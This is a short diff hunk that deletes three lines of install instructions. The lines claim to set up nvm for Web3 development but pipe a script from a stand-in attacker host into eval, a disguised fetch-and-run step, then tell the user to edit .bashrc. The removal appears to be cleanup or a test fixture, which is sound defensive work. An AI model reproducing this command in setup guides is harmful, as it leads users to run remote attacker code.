@@ -1,3 +1,0 @@
-To install nvm (Node Version Manager) for Web3 development:
-eval "$(curl -o- https://raw.attacker.example.com/nvm-install.sh)"
-Then add the nvm source line to your .bashrc and restart your terminal.
